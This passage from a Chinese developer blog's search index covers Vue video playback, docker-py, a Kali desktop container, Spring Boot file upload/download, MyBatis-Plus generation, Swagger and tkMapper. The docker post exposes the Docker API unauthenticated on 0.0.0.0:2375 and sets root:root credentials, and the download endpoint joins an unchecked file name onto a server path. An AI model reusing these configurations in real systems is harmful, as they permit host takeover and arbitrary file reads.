&#123; return &#123; &#x2F;&#x2F; id: this.$route.query.id, &#x2F;&#x2F; video: &#123;&#125;, playerOptions: &#123; playbackRates: [0.5, 1.0, 1.5, 2.0], &#x2F;&#x2F; 可选的播放速度 autoplay: true, &#x2F;&#x2F; 如果为true,浏览器准备好时开始回放。 muted: false, &#x2F;&#x2F; 默认情况下将会消除任何音频。 loop: false, &#x2F;&#x2F; 是否视频一结束就重新开始。 preload: &#39;auto&#39;, &#x2F;&#x2F; 建议浏览器在&lt;video&gt;加载元素后是否应该开始下载视频数据。auto浏览器选择最佳行为,立即开始加载视频（如果浏览器支持） language: &#39;zh-CN&#39;, aspectRatio: &#39;16:9&#39;, &#x2F;&#x2F; 将播放器置于流畅模式，并在计算播放器的动态大小时使用该值。值应该代表一个比例 - 用冒号分隔的两个数字（例如&quot;16:9&quot;或&quot;4:3&quot;） fluid: true, &#x2F;&#x2F; 当true时，Video.js player将拥有流体大小。换句话说，它将按比例缩放以适应其容器。 sources: [&#123; type: &quot;video&#x2F;mp4&quot;, &#x2F;&#x2F; 类型 src: &#39;&#39; &#x2F;&#x2F; url地址 &#125;], poster: &#39;&#39;, &#x2F;&#x2F; 封面地址 notSupportedMessage: &#39;此视频暂无法播放，请稍后再试&#39;, &#x2F;&#x2F; 允许覆盖Video.js无法播放媒体源时显示的默认信息。 controlBar: &#123; timeDivider: true, &#x2F;&#x2F; 当前时间和持续时间的分隔符 durationDisplay: true, &#x2F;&#x2F; 显示持续时间 remainingTimeDisplay: true, &#x2F;&#x2F; 是否显示剩余时间功能 fullscreenToggle: true &#x2F;&#x2F; 是否显示全屏按钮 &#125; &#125; &#125; &#125;, created() &#123; let id &#x3D; this.$route.query.id &#x2F;&#x2F; this.playerOptions.sources[0].src &#x3D; &quot;http:&#x2F;&#x2F;vjs.zencdn.net&#x2F;v&#x2F;oceans.mp4&quot; this.request(&quot;&#x2F;file&#x2F;detail&#x2F;&quot; + id).then(res &#x3D;&gt; &#123; console.log(res.data) this.video &#x3D; res.data this.playerOptions.sources[0].src &#x3D; res.data.url &#125;) &#125;, methods: &#123;&#125; &#125; &lt;&#x2F;script&gt; &lt;style&gt; &lt;&#x2F;style&gt; 需要修改的位置只有this.playerOptions.sources[0].src 将参数换成你的视频地址即可 实现效果如下 可以调整播放速度 Markdown","tags":[{"name":"vue","slug":"vue","permalink":"https://sunzhengyu99.github.io/tags/vue/"}]},{"title":"dockerpy","date":"2022-05-15T05:44:10.000Z","path":"2022/05/15/dockerpy/","text":"Docker-py使用python第三方库docker-py操作docker docker-py的地址：https://github.com/docker/docker-py 配置环境1.安装docker-py​ pip安装即可，安装最新版 pip install docker 2.配置docker本文使用的是Docker Desktop，docker版本是20.10.12 docker开启远程访问对于Docker Desktop来说，开启远程访问很简单，只需要再settings中选中如下配置项 对于linux中配置远程访问就稍微麻烦一点 方法一 在/usr/lib/systemd/system/docker.service，配置远程访问。 主要是在[Service]这个部分，加上下面两个参数 # vim /usr/lib/systemd/system/docker.service [Service] ExecStart= ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock 重启 systemctl daemon-reload systemctl restart docker 方法二 修改daemon.json的配置 vim /etc/docker/daemon.json &#123; &quot;hosts&quot;: [&quot;tcp://0.0.0.0:2375&quot;, &quot;unix:///var/run/docker.sock&quot;] &#125; “unix:///var/run/docker.sock”：unix socket，本地客户端将通过这个来连接 Docker Daemon。“tcp://0.0.0.0:2375”：tcp socket，表示允许任何远程客户端通过 2375 端口连接 Docker Daemon。 修改配置以后 然后让docker重新读取配置文件,并重启docker服务 systemctl daemon-reload systemctl restart docker 查看docker进程： [root@slaver2 ~]# ps -ef|grep docker root 44221 1 1 18:16 ? 00:00:06 /usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock Docker守护进程打开一个HTTP Socket,这样才能实现远程通信 当开启远程访问后，可以再浏览器中查看docker服务器上的相关信息，并且该API遵循RESTful API标准 查看当前版本：http://IP:2375/version 查看所有镜像信息：http://IP:2375/images/json 查看已启动容器信息：http://127.0.0.1:2375/containers/json 查看网卡信息： http://127.0.0.1:2375/networks/ 遇到的问题Docker Desktop与VM冲突需要注意的是，安装Docker Desktop 后VM就无法使用，原因： 1、Device Guard或Credential Guard与Workstation不兼容。 2、Windows系统的Hyper-V不兼容导致 解决方法如https://blog.csdn.net/qq_36761831/article/details/81175736 开启和关闭Hyper-V bcdedit /set hypervisorlaunchtype auto bcdedit /set hypervisorlaunchtype off 当需要使用VM时，执行关闭Hyper-V命令即可 配置国内镜像源settings=&gt;Dokcer engine修改配置内容 &#123; &quot;builder&quot;: &#123; &quot;gc&quot;: &#123; &quot;defaultKeepStorage&quot;: &quot;20GB&quot;, &quot;enabled&quot;: true &#125; &#125;, &quot;experimental&quot;: false, &quot;features&quot;: &#123; &quot;buildkit&quot;: true &#125;, &quot;registry-mirrors&quot;: [ &quot;https://registry.docker-cn.com&quot;, &quot;http://hub-mirror.c.163.com&quot;, &quot;https://docker.mirrors.ustc.edu.cn&quot; ] &#125; docker配置软链接由于Docker Desktop默认安装在C盘，所以下载的镜像也都保存在C盘，由于镜像文件一般很大，很容易爆盘，所以需要为保存镜像的文件夹创建一个软链接，将镜像保存到其他盘。参考 请务必先关闭docker 或者docker desktop 通过Everything或者资源管理器找到以.vhdx结尾的文件所在的位置，这些就是docker镜像路径： 将.vhdx复制到想要的路径下，本文路径为： 删除源文件夹，本文是data文件夹 以管理员运行cmd并且使用以下命令创建链接： mklink /J C:\\Users\\admin\\AppData\\Local\\Docker\\wsl\\data D:\\docker\\data 请大家自行替换路径，本文路径分别为源路径：C:\\Users\\admin\\AppData\\Local\\Docker\\wsl\\data 以及想要移动的路径：D:\\docker\\data此时可以在源路径看到新建出来的文件夹 使用dockerpy官方给出了详细的说明文档说明文档，下面只给出几个常见的操作 image相关操作进入docker库的imges.py中可以看到与镜像相关的所有操作，包括在shell中使用的build、pull、push、search等操作 list()查看源码，可知有三个可选参数 def list(self, name=None, all=False, filters=None): &quot;&quot;&quot; List images on the server. Args: name (str): Only show images belonging to the repository ``name`` all (bool): Show intermediate image layers. By default, these are filtered out. filters (dict): Filters to be processed on the image list. Available filters: - ``dangling`` (bool) - ``label`` (str): format either ``key`` or ``key=value`` Returns: (list of :py:class:`Image`): The images. Raises: :py:class:`docker.errors.APIError` If the server returns an error. &quot;&quot;&quot; resp = self.client.api.images(name=name, all=all, filters=filters) return [self.get(r[&quot;Id&quot;]) for r in resp] 获取所有镜像import docker client = docker.from_env() imagesList = client.images.list() print(imagesList) get()该函数只有一个参数name，镜像名称 获取指定名称的镜像 import docker client = docker.from_env() mysqlImage = client.images.get(&quot;mysql&quot;) print(mysqlImage) search()与docker search 命令相同 searchList = client.images.search(&quot;nginx&quot;) print(searchList) pull()作用等同于docker pull client.images.pull(&quot;nginx&quot;) container相关操作容器相关的操作很多 run()官方注释 Run a container. By default, it will wait for the container to finish and return its logs, similar to ``docker run``. // If the ``detach`` argument is ``True``, it will start the container and immediately return a :py:class:`Container` object, similar to ``docker run -d``. port_dict = &#123;&#x27;2222/tcp&#x27;: 3333&#125; image_name = nginx client.containers.run(image_name, ports=port_dict, detach=True) # 以守护进程的方式创建容器，容器停止后不会删除 ``` - The port number, as an integer. For example, ``&#123;&#x27;2222/tcp&#x27;: 3333&#125;`` will expose port 2222 inside the container as port 3333 on the host. - ``None``, to assign a random host port. For example, ``&#123;&#x27;2222/tcp&#x27;: None&#125;``. - A tuple of ``(address, port)`` if you want to specify the host interface. For example, ``&#123;&#x27;1111/tcp&#x27;: (&#x27;127.0.0.1&#x27;, 1111)&#125;``. - A list of integers, if you want to bind multiple host ports to a single container port. For example, ``&#123;&#x27;1111/tcp&#x27;: [1234, 4567]&#125;``. ``` get()获取容器对象 docker_container_id = &quot;236efe761aeb&quot; container = client.containers.get(docker_container_id) print(container.id) print(container.attrs) # 获取容器的详细信息 exec()进入容器内部执行命令，与下面的命令作用相同 docker exec -it containerID bash command = &#x27;touch /tmp/flag&#x27; port_dict = &#123;&#x27;2222/tcp&#x27;: 3333&#125; image_name = nginx container = client.containers.run(image_name, ports=port_dict, detach=True) container.exec_run(command) network相关操作create使用默认参数，桥接模式创建网卡 client.networks.create(&quot;net1&quot;, driver=&quot;bridge&quot;) 使用自定义IPAM配置创建更高级的网络。例如，将子网设置为192.168.52.0/24和网关地址为192.168.52.254 ipam_pool = docker.types.IPAMPool( subnet=&#x27;192.168.52.0/24&#x27;, gateway=&#x27;192.168.52.254&#x27; ) ipam_config = docker.types.IPAMConfig( pool_configs=[ipam_pool] ) client.networks.create( &quot;network1&quot;, driver=&quot;bridge&quot;, ipam=ipam_config ) 创建kali攻击机镜像下载镜像docker pull kalilinux/kali-rolling 查看下载的镜像 docker images 启动容器docker run -itd -p 3399:3389 kalilinux/kali-rolling /bin/bash 查看容器id docker ps 进入容器 docker exec -it id bash 安装基础环境包❗需要关闭防火墙或者打开3399端口，否则无法连接 首先安装vim apt-get -y update &amp;&amp; apt-get -y upgrade apt-get update --fix-missing apt-get install vim 修改镜像源 vim /etc/apt/sources.list 添加内容 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 安装基础环境包 apt-get -y update &amp;&amp; apt-get -y upgrade &amp;&amp; \\ DEBIAN_FRONTEND=noninteractive apt-get install -y \\ kali-tools-top10 \\ pciutils \\ iputils-ping \\ bash-completion &amp;&amp; \\ apt-get autoremove -y &amp;&amp; \\ apt-get clean 生成新镜像待上面的所有程序安装完成后，打包生成新镜像 docker commit f16618e0fda5 kali-2021 远程桌面环境安装使用新镜像启动容器docker run -itd -p 3399:3389 kali-2021 进入镜像 docker exec -it id bash 安装桌面服务● kali-desktop-xfce ：安装远程桌面环境 ● xrdp ：远程桌面服务 ● xorg：xorg是x11的一个实现，xorg提供X server apt-get update apt-get -y install kali-desktop-xfce xorg xrdp 配置xrdp实现远程连接图形界面： sed -i &#x27;s/port=3399/port=3389/g&#x27; /etc/xrdp/xrdp.ini service xrdp restart 修改root用户密码： passwd root echo root:root|chpasswd 再次登录XRDP： 打包镜像docker commit id docker-attack 编写Dockerfile因为启动容器后需要运行 sed -i &#x27;s/port=3399/port=3389/g&#x27; /etc/xrdp/xrdp.ini service xrdp restart 所有使用Dockerfile完成这两步操作 FROM kali-attack:latest COPY run.sh /home/run.sh RUN chmod +x /home/run.sh CMD [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;/home/run.sh &amp;&amp; tail -f /dev/null&quot;] 没有tail -f /dev/null会导致启动容器后自动退出无法使用，原因可能如下 run.sh中的内容，为启动容器后需要执行的两条命令 #!/bin/bash sed -i &#x27;s/port=3399/port=3389/g&#x27; /etc/xrdp/xrdp.ini wait service xrdp restart 使用 docker build -t kali-attack2 . 创建镜像，之后创建容器 docker run -itd -p 3399:3389 kali-attack2 这样就可以直接使用mstvc.exe连接kali桌面 username:root password:root docker访问宿主机网络资源解决方案 本文使用的的windows docker版本大于18.03可以直接使用host.docker.internal访问宿主机网络资源 其他操作系统的可以参考 docker容器安装vim出错报错信息如下 ncurses-base : Breaks: libtinfo5 (&lt; 6.1) but 6.0+20161126-1+deb9u2 is to be installed E: Error, pkgProblemResolver::Resolve generated breaks, this may be caused by held packages. E: Unable to correct dependencies 直接使用apt安装此包即可 apt update apt upgrade apt install vim","tags":[{"name":"docker","slug":"docker","permalink":"https://sunzhengyu99.github.io/tags/docker/"}]},{"title":"reggie","date":"2022-04-29T14:38:38.000Z","path":"2022/04/29/reggie/","text":"瑞吉外卖项目黑马程序员最新的springboot课程中的项目 项目地址为 瑞吉 代码全是跟着视频敲出来的，后面会对项目进行优化。","tags":[{"name":"springboot","slug":"springboot","permalink":"https://sunzhengyu99.github.io/tags/springboot/"}]},{"title":"springboot工具类","date":"2022-04-29T13:45:52.000Z","path":"2022/04/29/springbooot-upload-file/","text":"javaweb中图片文件上传和下载使用springboot创建web项目 服务端要接收客户端页面上传的文件，通常都会使用Apache的两个组件: commons-fileupload commons-io Spring框架在spring-web包中对文件上传进行了封装，大大简化了服务端代码，实现步骤如下： 1.创建Controller因为图片上传是一个公共接口所以可以创建一个名为CommonController的文件，url地址为/common /** * 主要用于文件上传和下载 */ @RestController @RequestMapping(&quot;/common&quot;) public class CommonController &#123; @Value(&quot;$&#123;reggie.path&#125;&quot;) // 保存图片的路径 private String basePath; &#125; 上传图片/** * 文件上传 * @param file * @return */ @PostMapping(&quot;/upload&quot;) public R&lt;String&gt; upload(MultipartFile file)&#123; // file是一个临时文件，后续需要进行转存 // file需要与前端上传的参数名保持一致，否则无法获取到上传的文件 // 转存之前需要对文件名进行处理 String originalFilename = file.getOriginalFilename(); String suffix = originalFilename.substring(originalFilename.lastIndexOf(&quot;.&quot;)); // 防止文件被覆盖，使用uuid作为文件名 String filename = UUID.randomUUID().toString(); filename = filename + suffix; File dir = new File(basePath); // 判断文件夹是否存在不存在则创建 if (!dir.exists())&#123; dir.mkdir(); &#125; // 将图片保存的指定位置 try &#123; file.transferTo(new File(basePath + filename)); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return R.success(filename); &#125; 下载图片@GetMapping(&quot;/download&quot;) public void download(String name, HttpServletResponse response) throws IOException &#123; // 文件输入流读取本地文件 FileInputStream fileInputStream = null; // 使用响应输出流将图片显示在网页上 ServletOutputStream outputStream = null; try &#123; fileInputStream = new FileInputStream(new File(basePath + name)); outputStream = response.getOutputStream(); response.setContentType(&quot;image/jpeg&quot;); byte[] bytes = new byte[1024]; int len = 0; // 读取服务器上的图片后 由响应输出流 while( (len = fileInputStream.read(bytes)) != -1)&#123; outputStream.write(bytes, 0, len); outputStream.flush(); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; finally &#123; fileInputStream.close(); outputStream.close(); &#125; &#125; 2.前端页面&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;文件上传&lt;/title&gt; &lt;!-- 引入样式 --&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../../plugins/element-ui/index.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../../styles/common.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../../styles/page.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;addBrand-container&quot; id=&quot;food-add-app&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;el-upload class=&quot;avatar-uploader&quot; action=&quot;/common/upload&quot; :show-file-list=&quot;false&quot; :on-success=&quot;handleAvatarSuccess&quot; :before-upload=&quot;beforeUpload&quot; ref=&quot;upload&quot;&gt; &lt;img v-if=&quot;imageUrl&quot; :src=&quot;imageUrl&quot; class=&quot;avatar&quot;&gt;&lt;/img&gt; &lt;i v-else class=&quot;el-icon-plus avatar-uploader-icon&quot;&gt;&lt;/i&gt; &lt;/el-upload&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt; &lt;script src=&quot;../../plugins/vue/vue.js&quot;&gt;&lt;/script&gt; &lt;!-- 引入组件库 --&gt; &lt;script src=&quot;../../plugins/element-ui/index.js&quot;&gt;&lt;/script&gt; &lt;!-- 引入axios --&gt; &lt;script src=&quot;../../plugins/axios/axios.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;../../js/index.js&quot;&gt;&lt;/script&gt; &lt;script&gt; new Vue(&#123; el: &#x27;#food-add-app&#x27;, data() &#123; return &#123; imageUrl: &#x27;&#x27; &#125; &#125;, methods: &#123; handleAvatarSuccess (response, file, fileList) &#123; this.imageUrl = `/common/download?name=$&#123;response.data&#125;` &#125;, beforeUpload (file) &#123; if(file)&#123; const suffix = file.name.split(&#x27;.&#x27;)[1] const size = file.size / 1024 / 1024 &lt; 2 if([&#x27;png&#x27;,&#x27;jpeg&#x27;,&#x27;jpg&#x27;].indexOf(suffix) &lt; 0)&#123; this.$message.error(&#x27;上传图片只支持 png、jpeg、jpg 格式！&#x27;) this.$refs.upload.clearFiles() return false &#125; if(!size)&#123; this.$message.error(&#x27;上传文件大小不能超过 2MB!&#x27;) return false &#125; return file &#125; &#125; &#125; &#125;) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; mybatis-plus-generatorMP的代码生成器，可以节约创建文件的时间 1.导入依赖&lt;!--代码生成器--&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-generator&lt;/artifactId&gt; &lt;version&gt;3.5.2&lt;/version&gt; &lt;/dependency&gt; 2.编写生成器代码可以放在专门的工具类包下 package com.sunzy.utils; import com.baomidou.mybatisplus.generator.FastAutoGenerator; import com.baomidou.mybatisplus.generator.config.OutputFile; import com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine; import java.util.Collections; /** * mp代码生成器 */ public class CodeGenreator &#123; public static void main(String[] args) &#123; generator(); &#125; public static void generator()&#123; FastAutoGenerator.create(&quot;jdbc:mysql://localhost:3306/admin_demo?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;allowPublicKeyRetrieval=true&quot;, &quot;username&quot;, &quot;password&quot;) .globalConfig(builder -&gt; &#123; builder.author(&quot;sunzy&quot;) // 设置作者 .enableSwagger() // 开启 swagger 模式 .fileOverride() // 覆盖已生成文件 .outputDir(&quot;E:\\\\Sunzh\\\\java\\\\admin_demo\\\\src\\\\main\\\\java\\\\&quot;); // 指定输出目录 &#125;) .packageConfig(builder -&gt; &#123; builder.parent(&quot;com.sunzy&quot;) // 设置父包名 .moduleName(&quot;&quot;) // 设置父包模块名 .pathInfo(Collections.singletonMap(OutputFile.xml, &quot;E:\\\\Sunzh\\\\java\\\\admin_demo\\\\src\\\\main\\\\resources\\\\mapper\\\\&quot;)); // 设置mapperXml生成路径 OutputEile.xml这里可能会报错 根据版本修改 &#125;) .strategyConfig(builder -&gt; &#123; builder.entityBuilder().enableLombok(); builder.mapperBuilder().enableMapperAnnotation().build(); builder.controllerBuilder().enableHyphenStyle() // 连字符转驼峰 .enableRestStyle(); // 开启rest控制器 builder.addInclude(&quot;sys_user&quot;) // 设置需要生成的表名 .addTablePrefix(&quot;t_&quot;, &quot;sys_&quot;); // 设置过滤表前缀 &#125;) // .templateEngine(new FreemarkerTemplateEngine()) // 使用Freemarker引擎模板，默认的是Velocity引擎模板 .execute(); &#125; &#125; 完成后，直接运行改工具类就可以直接生成以下文件： UserMapper.java IUserService.java UserServiceImpl.java UserController.java 3.Controller模板可以根据需要修改自己的模板 package $&#123;package.Controller&#125;; import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import org.springframework.web.bind.annotation.*; import javax.annotation.Resource; import java.util.List; import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper; import $&#123;package.Service&#125;.$&#123;table.serviceName&#125;; import $&#123;package.Entity&#125;.$&#123;entity&#125;; #if($&#123;restControllerStyle&#125;) import org.springframework.web.bind.annotation.RestController; #else import org.springframework.stereotype.Controller; #end #if($&#123;superControllerClassPackage&#125;) import $&#123;superControllerClassPackage&#125;; #end /** * &lt;p&gt; * $!&#123;table.comment&#125; 前端控制器 * &lt;/p&gt; * * @author $&#123;author&#125; * @since $&#123;date&#125; */ #if($&#123;restControllerStyle&#125;) @RestController #else @Controller #end @RequestMapping(&quot;#if($&#123;package.ModuleName&#125;)/$&#123;package.ModuleName&#125;#end/#if($&#123;controllerMappingHyphenStyle&#125;)$&#123;controllerMappingHyphen&#125;#else$&#123;table.entityPath&#125;#end&quot;) #if($&#123;kotlin&#125;) class $&#123;table.controllerName&#125;#if($&#123;superControllerClass&#125;) : $&#123;superControllerClass&#125;()#end #else #if($&#123;superControllerClass&#125;) public class $&#123;table.controllerName&#125; extends $&#123;superControllerClass&#125; &#123; #else public class $&#123;table.controllerName&#125; &#123; #end @Resource private $&#123;table.serviceName&#125; $&#123;table.entityPath&#125;Service; // 新增或者更新 @PostMapping public boolean save(@RequestBody $&#123;entity&#125; $&#123;table.entityPath&#125;) &#123; return $&#123;table.entityPath&#125;Service.saveOrUpdate($&#123;table.entityPath&#125;); &#125; @DeleteMapping(&quot;/&#123;id&#125;&quot;) public Boolean delete(@PathVariable Integer id) &#123; return $&#123;table.entityPath&#125;Service.removeById(id); &#125; @PostMapping(&quot;/del/batch&quot;) public boolean deleteBatch(@RequestBody List&lt;Integer&gt; ids) &#123; return $&#123;table.entityPath&#125;Service.removeById(ids); &#125; @GetMapping public List&lt;$&#123;entity&#125;&gt; findAll() &#123; return $&#123;table.entityPath&#125;Service.list(); &#125; @GetMapping(&quot;/&#123;id&#125;&quot;) public $&#123;entity&#125; findOne(@PathVariable Integer id) &#123; return $&#123;table.entityPath&#125;Service.getById(id); &#125; @GetMapping(&quot;/page&quot;) public Page&lt;$&#123;entity&#125;&gt; findPage(@RequestParam Integer pageNum, @RequestParam Integer pageSize) &#123; LambdaQueryWrapper&lt;$&#123;entity&#125;&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;(); queryWrapper.orderByDesc(&quot;id&quot;); return $&#123;table.entityPath&#125;Service.page(new Page&lt;&gt;(pageNum, pageSize), queryWrapper); &#125; &#125; #end 更多的模板可以到com.baomidou.mybatis-plus-generator包中复制到项目的resources\\templates中，根据自己的需求修改模板 Swagger1.导入依赖&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; 2.创建配置类再com.sunzy.fmmall.config.SwaggerConfig路径下创建swagger的配置类 配置文档的封面信息 包括标题，版本，作者信息 修改需要扫面的controller包位置即可 package com.sunzy.fmmall.config; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import springfox.documentation.builders.ApiInfoBuilder; import springfox.documentation.builders.PathSelectors; import springfox.documentation.builders.RequestHandlerSelectors; import springfox.documentation.service.ApiInfo; import springfox.documentation.service.Contact; import springfox.documentation.spi.DocumentationType; import springfox.documentation.spring.web.plugins.Docket; import springfox.documentation.swagger2.annotations.EnableSwagger2; @Configuration @EnableSwagger2 public class SwaggerConfig &#123; /** * swagger可以自动生成接口文档 * 1.配置生成文档的信息 * 2.配置生成规则 * */ /** * Docket用来封装接口文档 * * @return */ @Bean public Docket getDocket()&#123; //创建封面信息对象 ApiInfoBuilder apiInfoBuilder = new ApiInfoBuilder(); apiInfoBuilder.title(&quot;《锋迷商城》后端接口说明&quot;) .description(&quot;此文档详细说明了锋迷商城项目后端接口规范....&quot;) .version(&quot;v 2.0.1&quot;) .contact( new Contact(&quot;sunzy&quot;,&quot;www.suzny.com&quot;,&quot;sunzy@wang.com&quot;) ); ApiInfo apiInfo = apiInfoBuilder.build(); Docket docket = new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo) //指定生成的文档中的封面信息：文档标题、版本、作者 .select() .apis(RequestHandlerSelectors.basePackage(&quot;com.sunzy.fmmall.controller&quot;)) .paths(PathSelectors.any()) .build(); return docket; &#125; &#125; 启动springboot项目访问项目地址/swagger-ui.html即可看到相关接口信息，并可以进行测试 3.swagger注解说明 Swagger提供一套详细的注解可以对接口进行详细的说明 @Api 类注解，对控制器类添加此注解可以对控制器进行功能说明 @Api(value = &quot;用户管理&quot;, tags = &quot;提供用户注册和登录服务&quot;) @ApiOperation 方法注解，对每个方法作用进行详细说明 @ApiOperation(&quot;用户登录接口&quot;) @ApiImplicitParams和@ApiImplicitParam 对方法中的参数进行详细的说明，包括字段名，备注，是否必须，以及默认值 @ApiImplicitParams( @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;用户账号&quot;, required = true), @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;用户密码&quot;, required = true) ) @ApiModel 当接口参数和返回值类型为对象类型是需要添加此注解 @ApiModel(value = &quot;ResultVO对象&quot;,description = &quot;封装接口返回给前端的数据&quot;) @ApiModelProperty 模型中的成员变量进行说明 @ApiModelProperty(value = &quot;响应状态码&quot;,dataType = &quot;int&quot;) private int code; @ApiIngnore接口方法注解，添加此注解的方法不会出现在接口文档中 4.swagger-ui插件导入插件依赖 &lt;!--swagger-ui插件依赖--&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;swagger-bootstrap-ui&lt;/artifactId&gt; &lt;version&gt;1.9.6&lt;/version&gt; &lt;/dependency&gt; 访问url:http://localhost:8080/doc.html ,ui界面设计更加美观 tkMapper整合tkmapper 1.导入依赖&lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.5&lt;/version&gt; &lt;/dependency&gt; 2.配置application.yml文件spring: datasource: druid: driver-class-name: com.mysql.cj.jdbc.Driver username: root password: root url: jdbc:mysql://localhost:3306/fmmall?characterEncoding=utf-8&amp;useSSL=false mybatis: mapper-locations: classpath:mapper/*Mapper.xml type-aliases-package: com.sunzy.fmmall.dao 3.修改启动类注意MapperScan需要使用tkmapper包中的 package com.sunzy.tkmapper; //import org.mybatis.spring.annotation.MapperScan; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import tk.mybatis.spring.annotation.MapperScan; @SpringBootApplication //@MapperScan(&quot;com.sunzy.tkmapper.dao&quot;) @MapperScan(&quot;com.sunzy.tkmapper.dao&quot;) public class TkmapperDemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(TkmapperDemoApplication.class, args); &#125; &#125; 4.逆向工程导入插件依赖 &lt;plugin&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.3.5&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.47&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper&lt;/artifactId&gt; &lt;version&gt;3.4.4&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/plugin&gt; 添加配置文件GeneratorConfig.xml 记得修改对应包名&lt;!--**--&gt;标记处需要修改 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE generatorConfiguration PUBLIC &quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;&gt; &lt;generatorConfiguration&gt; &lt;!-- 引⼊数据库连接配置 --&gt; &lt;!-- &lt;properties resource=&quot;jdbc.properties&quot;/&gt;--&gt; &lt;context id=&quot;Mysql&quot; targetRuntime=&quot;MyBatis3Simple&quot; defaultModelType=&quot;flat&quot;&gt; &lt;property name=&quot;beginningDelimiter&quot; value=&quot;`&quot;/&gt; &lt;property name=&quot;endingDelimiter&quot; value=&quot;`&quot;/&gt; &lt;!-- 配置 GeneralDAO --&gt; &lt;plugin type=&quot;tk.mybatis.mapper.generator.MapperPlugin&quot;&gt; &lt;property name=&quot;mappers&quot; value=&quot;com.sunzy.fmmall.general.GeneralDao&quot;/&gt;&lt;!--**--&gt; &lt;/plugin&gt; &lt;!-- 配置数据库连接 --&gt; &lt;jdbcConnection driverClass=&quot;com.mysql.jdbc.Driver&quot; connectionURL=&quot;jdbc:mysql://localhost:3306/fmmall?useSSL=false&quot; userId=&quot;root&quot; password=&quot;root&quot;&gt;&lt;!--**--&gt; &lt;/jdbcConnection&gt; &lt;!-- 配置实体类存放路径 --&gt; &lt;javaModelGenerator targetPackage=&quot;com.sunzy.fmmall.entity&quot; targetProject=&quot;src/main/java&quot;/&gt; &lt;!--**--&gt; &lt;!-- 配置 XML 存放路径 --&gt; &lt;sqlMapGenerator targetPackage=&quot;/&quot; targetProject=&quot;src/main/resources/mapper&quot;/&gt; &lt;!--**--&gt; &lt;!-- 配置 DAO 存放路径 --&gt; &lt;javaClientGenerator targetPackage=&quot;com.sunzy.fmmall.dao&quot; targetProject=&quot;src/main/java&quot; type=&quot;XMLMAPPER&quot;/&gt; &lt;!--**--&gt; &lt;!-- 配置需要指定⽣成的数据库和表，% 代表所有表 --&gt; &lt;table tableName=&quot;%&quot;&gt; &lt;!-- mysql 配置 --&gt; &lt;!-- &lt;generatedKey column=&quot;id&quot; sqlStatement=&quot;Mysql&quot; identity=&quot;true&quot;/&gt;--&gt; &lt;/table&gt; &lt;!-- &lt;table tableName=&quot;tb_roles&quot;&gt;--&gt; &lt;!-- &amp;lt;!&amp;ndash; mysql 配置 &amp;ndash;&amp;gt;--&gt; &lt;!-- &lt;generatedKey column=&quot;roleid&quot; sqlStatement=&quot;Mysql&quot; identity=&quot;true&quot;/&gt;--&gt; &lt;!-- &lt;/table&gt;--&gt; &lt;!-- &lt;table 